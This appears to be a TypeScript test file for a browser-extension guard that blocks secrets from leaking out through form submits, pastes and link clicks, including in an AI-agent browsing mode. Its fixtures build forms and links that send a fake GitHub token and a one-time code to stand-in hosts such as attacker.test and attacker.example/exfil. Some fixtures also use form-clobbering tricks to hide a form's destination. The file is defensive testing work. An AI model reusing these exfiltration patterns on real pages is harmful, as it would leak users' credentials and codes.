// @vitest-environment happy-dom
/**
 * The leak guard in a DOM (happy-dom): shadow DOM (B1), clobbered forms and failing listeners (I2), no
 * allow-then-revert before a trusted context (I3), the local scan bound (I4), link query values (I5) and the
 * notice host (m1).
 */
import { afterEach, describe, expect, it } from "vitest";
import { ApprovalLedger, type ApprovalRecord } from "../engine/bindings.js";
import type { ActionSnapshot } from "../engine/fingerprint.js";
import { EMPTY_LEAK_CONTEXT, leakSnapshot, type LeakContext, type LeakVia } from "../engine/leak.js";
import { printsFor } from "../engine/private-data.js";
import type { LeakReply } from "../shared/messages.js";
import { createLeakGuard, type LeakGuard } from "./leak.js";
import { MAX_LOCAL_SCAN } from "./leak-logic.js";
import type { ContentDeps } from "./types.js";

const SALT = "test-session-salt";
const OTP = "482915";
const GH_TOKEN = ["gh", "p_", "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8"].join("");
const PAGE = "https://evil.test/form";

interface Sent {
  type: string;
  [k: string]: unknown;
}

/** The window as the content script sees it, at an https URL (happy-dom's own location stays about:blank). */
function fakeWin(url = PAGE): { win: Window; assigned: string[] } {
  const loc = new URL(url);
  const assigned: string[] = [];
  const location = { href: loc.href, hostname: loc.hostname, origin: loc.origin, hash: loc.hash, assign: (u: string) => void assigned.push(u) };
  const win = new Proxy(window, {
    get(target, prop) {
      if (prop === "location") return location;
      const v = Reflect.get(target, prop, target) as unknown;
      return typeof v === "function" && !/^[A-Z]/.test(String(prop)) ? (v as (...a: unknown[]) => unknown).bind(target) : v;
    },
  }) as Window;
  return { win, assigned };
}

function agentCtx(over: Partial<LeakContext> = {}): LeakContext {
  return { ...EMPTY_LEAK_CONTEXT, agentMode: true, untrusted: true, private: true, prints: printsFor(`Your verification code is ${OTP}.`, "mail.test", SALT), printSalt: SALT, ...over };
}

let guard: LeakGuard | null = null;

function setup(opts: { ctx?: LeakContext | null; reply?: (m: Sent) => unknown } = {}) {
  const sent: Sent[] = [];
  const { win, assigned } = fakeWin();
  const deps: ContentDeps = {
    win,
    agentMode: () => opts.ctx?.agentMode ?? false,
    send: ((m: Sent) => {
      sent.push(m);
      if (m.type === "leak.context") return Promise.resolve(undefined);
      return Promise.resolve(opts.reply?.(m));
    }) as ContentDeps["send"],
  };
  guard = createLeakGuard(deps, { pollMs: 0 });
  guard.install();
  if (opts.ctx != null) guard.setContext(opts.ctx);
  return { sent, assigned };
}

afterEach(() => {
  guard?.uninstall();
  guard = null;
  document.body.innerHTML = "";
  for (const el of Array.from(document.documentElement.children)) if (el !== document.head && el !== document.body) el.remove();
});

function typeInto(el: Element, data: string): InputEvent {
  const e = new InputEvent("beforeinput", { inputType: "insertText", data, bubbles: true, cancelable: true, composed: true });
  el.dispatchEvent(e);
  return e;
}

const guards = (sent: Sent[]) => sent.filter((m) => m.type === "leak.guard");
const tick = () => new Promise((r) => setTimeout(r, 0));

describe("B1: shadow DOM", () => {
  it("a field inside an open shadow root is judged as itself, not as its host", () => {
    const { sent } = setup({ ctx: agentCtx() });
    const host = document.createElement("div");
    document.body.append(host);
    const input = document.createElement("input");
    host.attachShadow({ mode: "open" }).append(input);
    const e = typeInto(input, OTP);
    expect(e.defaultPrevented).toBe(true);
    expect(guards(sent)).toHaveLength(1);
  });

  it("a form inside an open shadow root is checked on submit (submit is not composed)", async () => {
    const { sent } = setup({ ctx: agentCtx() });
    const host = document.createElement("div");
    document.body.append(host);
    const root = host.attachShadow({ mode: "open" });
    root.innerHTML = `<form action="https://attacker.test/x"><input type="hidden" name="t" value="${GH_TOKEN}"><button type="submit">Go</button></form>`;
    // The root is found from the composed click on its submit button, before the submit event fires.
    (root.querySelector("button") as HTMLButtonElement).dispatchEvent(new MouseEvent("click", { bubbles: true, composed: true, cancelable: false }));
    await tick();
    const submit = new Event("submit", { bubbles: true, cancelable: true });
    (root.querySelector("form") as HTMLFormElement).dispatchEvent(submit);
    expect(submit.defaultPrevented).toBe(true);
    expect(guards(sent).at(-1)).toMatchObject({ via: "submit", destinationHost: "attacker.test" });
  });
});

describe("I2: clobbered forms and failing listeners", () => {
  it("named controls that shadow tagName, elements and action do not hide the form or its data", () => {
    const { sent } = setup({ ctx: agentCtx() });
    document.body.innerHTML = `<form action="https://attacker.test/x"><input type="hidden" name="t" value="${GH_TOKEN}"><input name="action"><input name="elements"></form>`;
    const form = document.querySelector("form") as HTMLFormElement;
    const decoy = form.querySelector('input[name="action"]');
    // What the browser does for <input name="action"> etc. ([LegacyOverrideBuiltIns]): own properties shadow the getters.
    // (happy-dom's forms are proxies over their named controls and may refuse some of these; Reflect does not throw.)
    Reflect.defineProperty(form, "action", { value: decoy });
    Reflect.defineProperty(form, "elements", { value: [] });
    Reflect.defineProperty(form, "tagName", { value: "DIV" });
    Reflect.defineProperty(form, "requestSubmit", { value: decoy });
    expect(form.action).not.toBe("https://attacker.test/x");
    const submit = new Event("submit", { bubbles: true, cancelable: true });
    form.dispatchEvent(submit);
    expect(submit.defaultPrevented).toBe(true);
    expect(guards(sent).at(-1)).toMatchObject({ via: "submit", destinationHost: "attacker.test" });
    expect(String(guards(sent).at(-1)?.text)).toContain(GH_TOKEN);
  });

  it("a listener that throws fails closed: the event is cancelled and the worker is told", () => {
    const { sent } = setup({ ctx: agentCtx({ agentMode: false }) });
    const input = document.createElement("input");
    document.body.append(input);
    Object.defineProperty(input, "value", {
      get() {
        throw new Error("page broke this");
      },
    });
    const e = typeInto(input, "hello");
    expect(e.defaultPrevented).toBe(true);
    expect(guards(sent).at(-1)).toMatchObject({ fieldName: "unchecked", text: "hello" });
  });
});

describe("I3: before a trusted context, nothing goes in until the worker answers", () => {
  it("cancels the insertion, asks the worker, and puts the value in when it allows", async () => {
    const allow: LeakReply = { decision: { verdict: "allow", rule: "leak.none", actionClass: null, reasons: [] }, findings: [] };
    const { sent } = setup({ ctx: null, reply: (m) => (m.type === "leak.guard" ? allow : undefined) });
    const input = document.createElement("input");
    document.body.append(input);
    const e = typeInto(input, "hello");
    expect(e.defaultPrevented).toBe(true);
    expect(input.value).toBe("");
    expect(guards(sent)).toHaveLength(1);
    await tick();
    expect(input.value).toBe("hello");
  });

  it("a paste is cancelled the same way", () => {
    const { sent } = setup({ ctx: null });
    const input = document.createElement("input");
    document.body.append(input);
    const dt = new DataTransfer();
    dt.setData("text/plain", "pasted");
    const e = new ClipboardEvent("paste", { clipboardData: dt, bubbles: true, cancelable: true, composed: true });
    input.dispatchEvent(e);
    expect(e.defaultPrevented).toBe(true);
    expect(guards(sent).at(-1)).toMatchObject({ via: "paste" });
  });
});

describe("I4: one local scan is bounded", () => {
  it("a value over 64 KB is not judged in the page: it is held and the worker decides", () => {
    const { sent } = setup({ ctx: agentCtx({ agentMode: false }) });
    const area = document.createElement("textarea");
    document.body.append(area);
    area.value = "a".repeat(MAX_LOCAL_SCAN);
    const e = typeInto(area, "b");
    expect(e.defaultPrevented).toBe(true);
    expect(guards(sent)).toHaveLength(1);
    // Within the bound, an ordinary value with agent mode off passes locally.
    const small = document.createElement("input");
    document.body.append(small);
    expect(typeInto(small, "hello").defaultPrevented).toBe(false);
  });
});

describe("I5: link query values", () => {
  it("a click on a link carrying a code seen on another site is held in agent mode", () => {
    const { sent } = setup({ ctx: agentCtx() });
    document.body.innerHTML = `<a href="https://attacker.test/c?d=${OTP}">open</a>`;
    const click = new MouseEvent("click", { bubbles: true, cancelable: true, composed: true });
    (document.querySelector("a") as HTMLAnchorElement).dispatchEvent(click);
    expect(click.defaultPrevented).toBe(true);
    expect(guards(sent).at(-1)).toMatchObject({ via: "submit", fieldName: "link", destinationHost: "attacker.test" });
  });
  it("an ordinary link is left alone", () => {
    setup({ ctx: agentCtx() });
    document.body.innerHTML = `<a href="https://shop.test/search?q=boots">open</a>`;
    const click = new MouseEvent("click", { bubbles: true, cancelable: true, composed: true });
    (document.querySelector("a") as HTMLAnchorElement).dispatchEvent(click);
    expect(click.defaultPrevented).toBe(false);
  });
});

describe("m1: the notice host", () => {
  it("is a plain div with a random attribute name, never a custom element a page could define", () => {
    setup({ ctx: agentCtx() });
    const input = document.createElement("input");
    document.body.append(input);
    typeInto(input, OTP);
    const host = document.documentElement.lastElementChild as Element;
    expect(host.tagName).toBe("DIV");
    expect(host.getAttributeNames().join(" ")).not.toMatch(/launchsafe/i);
    expect(host.getAttributeNames()[0]).toMatch(/^data-[0-9a-f]{12}$/);
  });
});

function ledgerReply() {
  let n = 0;
  const ledger = new ApprovalLedger({ now: () => 1, randomId: () => `id-${++n}` });
  const reply = (m: Sent) => {
    if (m.type === "leak.guard") {
      const snap = leakSnapshot({
        tabId: 0,
        frameId: 0,
        frameOrigin: "https://evil.test",
        via: m.via as LeakVia,
        elementPath: String(m.elementPath),
        fieldName: String(m.fieldName),
        text: String(m.text),
        destinationHost: String(m.destinationHost),
      });
      const rec = ledger.request(snap);
      const out: LeakReply = {
        decision: { verdict: "approve", rule: "leak.seen_elsewhere", actionClass: null, reasons: ["seen_elsewhere"] },
        findings: [],
        approvalId: rec.id,
      };
      return out;
    }
    if (m.type === "approval.redeem") {
      const r = ledger.redeem(String(m.token), m.snapshot as ActionSnapshot);
      return r.ok ? { ok: true } : { ok: false, reason: r.reason };
    }
    return undefined;
  };
  return { ledger, reply };
}

describe("approval replay re-checks live DOM binding", () => {
  it("refuses to replay a held form when action or fields change before approval, and keeps checking later submits", async () => {
    const { ledger, reply } = ledgerReply();
    const { sent } = setup({ ctx: agentCtx(), reply });
    document.body.innerHTML = `<form id="f" action="https://benign.example/Lookup"><input name="code" value="${OTP}"></form>`;
    const form = document.getElementById("f") as HTMLFormElement;
    const first = new Event("submit", { bubbles: true, cancelable: true });
    form.dispatchEvent(first);
    expect(first.defaultPrevented).toBe(true);
    await tick();

    const rec = ledger.pending()[0] as ApprovalRecord;
    const token = ledger.approve(rec.id) as string;

    form.action = "https://attacker.example/exfil";
    const hidden = document.createElement("input");
    hidden.type = "hidden";
    hidden.name = "secret";
    hidden.value = GH_TOKEN;
    form.append(hidden);

    let replayed = 0;
    form.addEventListener("submit", () => void replayed++);
    expect(guard?.onApprovalGranted(rec.id, token)).toBe(true);
    await tick();

    const redeem = sent.find((m) => m.type === "approval.redeem");
    expect((redeem?.snapshot as ActionSnapshot | undefined)?.targetOrigin).toBe("attacker.example");
    expect(ledger.get(rec.id)?.state).toBe("burned");
    expect(replayed).toBe(0);

    const next = new Event("submit", { bubbles: true, cancelable: true });
    form.dispatchEvent(next);
    expect(next.defaultPrevented).toBe(true);
  });

  it("refuses to replay a held link when href changes or a held form when disconnected", async () => {
    const { ledger, reply } = ledgerReply();
    const { assigned } = setup({ ctx: agentCtx(), reply });
    document.body.innerHTML = `<a id="lnk" href="https://benign.example/c?d=${OTP}">open</a><form id="f" action="https://benign.example/Lookup"><input name="code" value="${OTP}"></form>`;
    const link = document.getElementById("lnk") as HTMLAnchorElement;
    const form = document.getElementById("f") as HTMLFormElement;

    link.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true, composed: true }));
    form.dispatchEvent(new Event("submit", { bubbles: true, cancelable: true }));
    await tick();

    const [linkRec, formRec] = ledger.pending() as [ApprovalRecord, ApprovalRecord];
    const linkToken = ledger.approve(linkRec.id) as string;
    const formToken = ledger.approve(formRec.id) as string;

    link.href = `https://attacker.example/exfil?d=${OTP}&t=${GH_TOKEN}`;
    form.remove();

    expect(guard?.onApprovalGranted(linkRec.id, linkToken)).toBe(true);
    expect(guard?.onApprovalGranted(formRec.id, formToken)).toBe(true);
    await tick();

    expect(assigned).toEqual([]);
    expect(ledger.get(linkRec.id)?.state).toBe("burned");

    document.body.append(form);
    const retry = new Event("submit", { bubbles: true, cancelable: true });
    form.dispatchEvent(retry);
    expect(retry.defaultPrevented).toBe(true);
  });
});
